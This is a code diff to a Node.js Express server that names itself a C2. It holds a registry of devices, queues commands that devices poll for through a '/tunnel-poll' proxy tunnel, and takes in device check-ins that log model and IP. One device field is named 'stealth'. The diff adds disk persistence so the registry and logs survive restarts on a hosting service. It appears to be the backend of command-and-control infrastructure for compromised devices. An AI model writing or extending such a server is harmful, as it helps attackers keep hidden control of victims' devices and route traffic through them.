@@ -2,6 +2,7 @@ const express = require('express');
 const http = require('http');
 const cors = require('cors');
 const path = require('path');
+const fs = require('fs');
 
 const app = express();
 const server = http.createServer(app);
@@ -13,11 +14,48 @@ app.use(express.json({ limit: '50mb' }));
 app.use(express.urlencoded({ extended: true, limit: '50mb' }));
 app.use('/c2', express.static(path.join(__dirname, 'c2')));
 
-// In-memory telemetry, device registry, command queues, and pending responses
+// In-memory telemetry, device registry, command queues, and pending responses (with disk persistence for Render)
 const devices = new Map();
 const commandQueues = new Map(); // deviceId -> array of requests
 const pendingResponses = new Map(); // requestId -> { res }
 const telemetryLogs = [];
+
+const DATA_FILE = path.join(__dirname, 'devices.json');
+
+function loadData() {
+    try {
+        if (fs.existsSync(DATA_FILE)) {
+            const raw = fs.readFileSync(DATA_FILE, 'utf8');
+            const json = JSON.parse(raw);
+            if (json.devices && Array.isArray(json.devices)) {
+                json.devices.forEach(d => {
+                    if (d && d.deviceId) devices.set(d.deviceId, d);
+                });
+            }
+            if (json.logs && Array.isArray(json.logs)) {
+                telemetryLogs.push(...json.logs);
+            }
+            console.log(`[PERSISTENCE] Loaded ${devices.size} devices and ${telemetryLogs.length} logs from disk.`);
+        }
+    } catch (e) {
+        console.error('[PERSISTENCE] Load error:', e.message);
+    }
+}
+
+function saveData() {
+    try {
+        const data = {
+            devices: Array.from(devices.values()),
+            logs: telemetryLogs.slice(0, 200)
+        };
+        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2), 'utf8');
+    } catch (e) {
+        console.error('[PERSISTENCE] Save error:', e.message);
+    }
+}
+
+// Load persisted state on startup
+loadData();
 
 // Device polls for pending proxy commands
 app.get('/tunnel-poll', (req, res) => {
@@ -74,6 +112,7 @@ app.all('/proxy*', (req, res) => {
             stealth: false,
             lastSeen: new Date().toISOString()
         });
+        saveData();
     }
 
     const requestId = Math.random().toString(36).substring(7);
@@ -215,7 +254,6 @@ app.get('/api/status', (req, res) => {
 });
 
 // Device Check-in & Telemetry Ingestion endpoints (supports both / and /checkin)
-app.get('/checkin', (req, res) => res.json({ status: 'ACTIVE', message: 'C2 Check-in endpoint ready for POST telemetry.' }));
 app.post('/', handleCheckin);
 app.post('/checkin', handleCheckin);
 
@@ -247,6 +285,8 @@ function handleCheckin(req, res) {
         });
 
         if (telemetryLogs.length > 500) telemetryLogs.pop();
+
+        saveData();
 
         console.log(`[CHECKIN] Device ID: ${deviceId} | Model: ${merged.model || merged.device} | IP: ${merged.ip}`);
         res.json({ success: true, message: 'Telemetry received successfully' });
